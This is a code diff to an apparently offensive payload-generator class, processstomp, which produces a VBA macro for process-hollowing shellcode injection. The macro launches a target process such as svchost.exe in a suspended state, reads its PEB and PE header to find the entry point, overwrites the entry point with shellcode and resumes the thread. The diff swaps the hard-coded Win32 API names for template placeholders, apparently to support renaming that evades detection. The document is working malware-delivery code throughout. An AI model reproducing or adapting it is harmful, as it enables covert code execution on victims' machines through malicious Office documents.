@@ -7,16 +7,7 @@ class processstomp:
             self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
-        return ['Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long',
-'Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr',
-'Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long',
-'Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long',
-'Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long',
-'Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)',
-'Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr',
-'Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr',
-'Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long',
-'Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long']
+        return []
   
     def compilerOptions(self) -> list[str]:
         return []
@@ -64,20 +55,20 @@ End Type
     def template(self) -> str:
         return Template("""
     Dim si As STARTUPINFOA
-    RtlZeroMemory si, Len(si)
+    {RtlZeroMemory} si, Len(si)
     si.cb = Len(si)
     si.dwFlags = &H100
     Dim pi As PROCESS_INFORMATION
     Dim procOutput As LongPtr
     ' Start svchost.exe in a suspended state
-    procOutput = CreateProcessA(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
+    procOutput = {CreateProcessA}(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
     
     Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
     Dim ProcInfo As LongPtr
     ProcInfo = pi.hProcess
     Dim PEBinfo As LongPtr
 
-    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
+    zwOutput = {ZwQueryInformationProcess}(ProcInfo, 0, ProcBasicInfo, 48, 0)
     PEBinfo = ProcBasicInfo.PebAddress + 16
     Dim AddrBuf(7) As Byte
 
@@ -85,7 +76,7 @@ End Type
     tmp = 0
 
     ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
-    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
+    readOutput = {ReadProcessMemory}(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
     svcHostBase = AddrBuf(7) * (2 ^ 56)
     svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
     svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
@@ -97,7 +88,7 @@ End Type
 
     Dim data(512) As Byte
     ' Read more data from PEB so e_lfanew offset can be retrieved
-    readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
+    readOutput2 = {ReadProcessMemory}(ProcInfo, svcHostBase, data(0), 512, tmp)
     
     ' Read e_lfanew offset value and add 40
     Dim e_lfanew_offset As Long
@@ -131,7 +122,7 @@ End Type
     Next y
 
     ' Write the shellcode into the svchost.exe entry point
-    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
+    a = {WriteProcessMemory}(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
     ' Resume svchost.exe process to run the shellcode
-    b = ResumeThread(pi.hThread)
+    b = {ResumeThread}(pi.hThread)
 """).substitute(target=self.target)
